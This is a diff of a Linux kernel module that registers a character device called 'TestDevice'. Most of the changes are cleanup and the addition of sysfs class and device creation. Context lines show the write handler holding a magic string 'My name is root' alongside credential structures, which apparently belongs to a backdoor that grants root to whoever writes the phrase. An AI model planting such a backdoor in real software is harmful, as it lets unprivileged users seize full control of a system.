@@ -1,18 +1,22 @@
-#include <linux/init.h>   
-#include <linux/module.h> 
-#include <linux/kernel.h>
+#include <linux/cdev.h>
+#include <linux/cred.h>
 #include <linux/device.h>
-#include <linux/fs.h>    
-#include <asm/uaccess.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
 #include <linux/slab.h>
 #include <linux/syscalls.h>
 #include <linux/types.h>
-#include <linux/cdev.h>
-#include <linux/cred.h>
+#include <linux/uaccess.h>
 #include <linux/version.h>
 
+MODULE_LICENSE("GPL");
+
 #define DEVICE_NAME "TestDevice"  // name--> appears in /proc/devices
-#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
+#define CLASS_NAME "Test"         ///< The device class
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 4, 0)
 #define V(x) x.val
 #else
 #define V(x) x
@@ -29,9 +33,10 @@ static struct file_operations fops = {
     .write   = dev_write,
     .release = dev_release,
 };
-
-struct cdev *mcdev;
-static int   major;
+static struct device *cdevice = NULL;
+struct class *        devClass;
+struct cdev *         mcdev;
+static int            major;
 int ret;  // will be used to hold return values of functions; this is because
           // the kernel stack is very small so declaring variables all over the
           // pass in our module functions eats up the stack very fast
@@ -39,6 +44,10 @@ dev_t dev_num;  // will hold major number that kernel gives us
 
 static int __init test_init(void) {
   ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
+
+  // Create a class which will appear at /sys/class
+  devClass = class_create(THIS_MODULE, CLASS_NAME);
+  cdevice  = device_create(devClass, NULL, dev_num, NULL, DEVICE_NAME);
 
   if (ret < 0) {
     printk(KERN_ALERT "Load failed\n");
@@ -55,6 +64,7 @@ static int __init test_init(void) {
   mcdev->owner = THIS_MODULE;
 
   ret = cdev_add(mcdev, dev_num, 1);
+
   if (ret < 0) {
     printk(KERN_ALERT "%s: unable to add cdev to kernel", DEVICE_NAME);
     return ret;
@@ -65,7 +75,10 @@ static int __init test_init(void) {
 }
 
 static void __exit test_exit(void) {
+  device_destroy(devClass, dev_num);
   cdev_del(mcdev);
+  class_unregister(devClass);
+  class_destroy(devClass);
   unregister_chrdev_region(dev_num, 1);
   printk(KERN_INFO "Module has been unloaded\n");
 }
@@ -76,9 +89,9 @@ static int dev_open(struct inode *inodep, struct file *filep) {
 }
 
 static ssize_t dev_write(struct file *filep,
-                         const char __user * buf,
-                         size_t       len,
-                         loff_t *     offset) {
+                         const char __user *buf,
+                         size_t             len,
+                         loff_t *           offset) {
   char *       data;
   char         magic[] = "My name is root";
   struct cred *new_cred;
